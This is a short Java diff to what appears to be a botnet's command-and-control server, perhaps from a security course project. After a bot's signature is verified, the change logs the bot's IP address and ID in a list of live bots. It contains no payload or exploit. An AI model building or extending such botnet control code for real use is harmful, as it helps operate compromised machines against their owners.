@@ -22,6 +22,7 @@ import com.fasterxml.jackson.databind.cfg.SerializerFactoryConfig;
 
 import cs.sii.config.onLoad.Config;
 import cs.sii.control.command.Commando;
+import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.model.bot.Bot;
 import cs.sii.model.role.Role;
@@ -78,8 +79,12 @@ public class CommandController {
 					try {
 						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,cmm.getPki().rebuildPuK(b.getPubKey()));
 						System.out.println("Ritorno verifica "+flag);
-						if (flag)
+						if (flag){
+							Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(req.getRemoteAddr()), idBot);
+							cmm.getnServ().getAliveBot().add(botAlive);
 							response = new Pairs<Long, Integer>(new Long(-1), -1);
+						}
+							
 						else
 							response = cmm.authReq(idBot);
 					} catch (InvalidKeyException | SignatureException e) {
